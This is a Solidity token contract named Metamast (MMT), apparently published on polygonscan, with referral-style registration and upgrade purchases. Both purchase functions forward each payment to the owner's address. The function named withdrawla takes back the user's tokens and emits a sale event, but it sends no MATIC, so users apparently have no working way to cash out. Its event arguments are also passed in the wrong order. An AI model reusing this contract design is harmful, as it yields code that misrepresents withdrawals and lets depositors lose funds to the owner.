/**
 *Submitted for verification at polygonscan.com on 2023-06-06
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);   
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient,uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
}

library Address {
 
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash= 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount,"Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success,"Address: unable to send value, recipient may have reverted");
    }

 
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall( address target, bytes memory data, string memory errorMessage ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

 
    function functionCallWithValue( address target,bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue( target, data, value,"Address: low-level call with value failed");
    }


    function functionCallWithValue( address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require( address(this).balance >= value,"Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue( address target, bytes memory data, uint256 weiValue,string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{value: weiValue}(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address previousOwner, address newOwner);

    function owner() public view returns (address) {
    return _owner;
    }

    function setOwner(address newOwner) internal {
        _owner = newOwner;
    }

    modifier onlyOwner() {
        require(_msgSender() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0),"Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        setOwner(newOwner);
    }
}

contract Pausable is Ownable {
    event Pause();
    event Unpause();

    bool public paused = false;

    modifier whenNotPaused() {
    require(!paused, "Pausable: paused");
    _;
    }


    function pause() external onlyOwner {
        paused = true;
        emit Pause();
    }

 
    function unpause() external onlyOwner {
        paused = false;
        emit Unpause();
    }


}

abstract contract Initializable {

    bool private _initialized;

    bool private _initializing;

    modifier initializer() {
        require(_initializing || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }
}

contract Metamast is  Ownable, Pausable, Initializable {


    uint public INIT_PRICE;
    uint public FACTOR; 
    uint public  FACTOR_DIVIDER;
    uint public totalSupply;
    uint public decimal;

    string public name;
    string public symbol;

    mapping(address => uint256) internal balances;

    event Buy( address indexed  user , uint maticAmt, uint price, uint tokenAmt);
    event Selltoken( address indexed  user , uint maticAmt, uint price, uint tokenAmt);
    event LevelUpgrade(address indexed investor,uint256 amountBuy,uint256 tokenPrice);
    event Registration(address indexed investor,string referrer,string referrerId,uint256 package,uint256 tokenPrice,uint256 tokenQty);

    function initialize(address _owner,uint _totalSupply) external initializer {
        INIT_PRICE = 1000000000;
        FACTOR = 10; 
        FACTOR_DIVIDER = 100;
        totalSupply = _totalSupply*10**18;
        setOwner(_owner);
        balances[address(this)] = (_totalSupply*10**18);
        decimal = 18;
        name = "Metamast";
        symbol = "MMT";
    }

    function price() public  view returns (uint) {
        return (INIT_PRICE+(((INIT_PRICE*(address(this).balance))*FACTOR)/FACTOR_DIVIDER)/1e18);
    }

    function balanceOf(address user) external view returns (uint) {
        return balances[user];
    }

    function registration(string memory refadd,string memory _referrerId,uint mmtAmount ) public payable {
       require (msg.value>=mmtAmount,"Invalid Amount");
        uint _price = price();
        uint tokenQty =((mmtAmount*1e18)*25/100)/_price;
        balances[address(this)]-= tokenQty;
        balances[_msgSender()]+= tokenQty;
        address owner=owner();
        payable(owner).transfer(mmtAmount);
        emit Registration(msg.sender,refadd,_referrerId,msg.value,_price,tokenQty);
   	}

    function autoUpgrade(uint mmtAmount ) public payable {
       require (msg.value>=mmtAmount,"Invalid Amount");
        uint _price = price();
        uint tokenQty =((mmtAmount*1e18)*25/100)/_price;
        balances[address(this)]-= tokenQty;
        balances[_msgSender()]+= tokenQty;
        address owner=owner();
        payable(owner).transfer(mmtAmount);
        emit LevelUpgrade(msg.sender,tokenQty,_price);
   	}

    function withdrawla(uint tokenQty ) public payable {
        require(balances[_msgSender()]>=tokenQty,"Insufficient token Balance");
        uint _price = price();
        uint maticAmt =tokenQty*_price;
        balances[address(this)]+= tokenQty;
        balances[_msgSender()]-= tokenQty;
        emit Selltoken(msg.sender,maticAmt,tokenQty,_price);
   	}


}